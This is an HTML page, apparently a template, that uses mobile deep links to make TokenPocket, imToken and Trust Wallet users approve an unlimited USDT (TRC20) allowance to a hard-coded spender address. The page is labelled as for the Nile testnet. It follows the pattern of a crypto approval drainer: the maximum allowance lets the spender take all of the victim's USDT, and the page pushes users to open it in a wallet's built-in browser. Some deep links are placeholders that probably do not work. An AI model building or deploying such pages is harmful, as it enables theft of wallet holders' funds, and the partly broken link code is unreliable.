<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>USDT 无限授权 - 直接唤起钱包</title>
  <style>
    body { font-family: system-ui; text-align: center; padding: 40px 20px; background: #f0f8ff; }
    h1 { color: #0066cc; }
    button { padding: 20px 50px; font-size: 22px; margin: 15px; background: #00bfff; color: white; border: none; border-radius: 12px; cursor: pointer; width: 80%; max-width: 400px; }
    button:hover { background: #0099cc; }
    #log { background: white; padding: 25px; margin: 30px auto; max-width: 700px; border-radius: 10px; text-align: left; line-height: 1.6; border: 1px solid #ccc; }
  </style>
</head>
<body>
  <h1>TRC20 USDT 无限授权（Nile 测试网）</h1>
  <p><strong>Spender：</strong>TMeT3BTESwLNJiNd6QVMBXW1Y496TX2ps3</p>
  <p>测试网 USDT 合约：TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf</p>

  <button onclick="tryTokenPocket()">1. 尝试唤起 TokenPocket 授权</button>
  <button onclick="tryImToken()">2. 尝试唤起 imToken 授权</button>
  <button onclick="tryTrustWallet()">3. 尝试唤起 Trust Wallet</button>

  <div id="log">点击按钮后，浏览器会尝试直接打开对应钱包 App 并弹出授权窗口。<br>如果没反应，说明该钱包 deep link 被 iOS 限制，需要在钱包内置浏览器中打开本页面。</div>

  <script>
    const USDT = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
    const SPENDER = "TMeT3BTESwLNJiNd6QVMBXW1Y496TX2ps3";
    const MAX = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
    const log = document.getElementById("log");

    function tryTokenPocket() {
      log.innerHTML = "正在尝试唤起 TokenPocket...<br>如果没弹出，请手动在 TokenPocket 内置浏览器打开本网页";
      // TokenPocket deep link 示例（简化，实际常需在钱包内打开网页）
      const tpLink = `tpoutside://pull.activity?param=${encodeURIComponent(JSON.stringify({
        action: "approve",
        contract: USDT,
        spender: SPENDER,
        amount: MAX,
        dappName: "USDT无限授权"
      }))}`;
      window.location.href = tpLink;
      setTimeout(() => {
        log.innerHTML += "<br><br>如果没反应 → 打开 TokenPocket → 发现/浏览器 → 粘贴本网页链接打开";
      }, 2000);
    }

    function tryImToken() {
      log.innerHTML = "正在尝试唤起 imToken...<br>imToken 支持 WalletConnect 和 deep link";
      // imToken deep link 示例（常用于导航或 WC）
      const imLink = `imtokenv2://wc?uri=wc:tron-approve-test@2`;
      window.location.href = imLink;
      setTimeout(() => {
        log.innerHTML += "<br><br>如果没反应 → 在 imToken 里打开 DApp 浏览器，粘贴本网页链接";
      }, 2000);
    }

    function tryTrustWallet() {
      log.innerHTML = "正在尝试唤起 Trust Wallet...";
      // Trust Wallet 常用 WC deep link
      const trustLink = "trust://wc?uri=wc:tron-usdt-approve@2";
      window.location.href = trustLink;
      setTimeout(() => {
        log.innerHTML += "<br><br>Trust Wallet 常需 WC 协议，如果没弹出，请在 Trust Wallet 内置浏览器打开本页面";
      }, 2000);
    }
  </script>
</body>
</html>
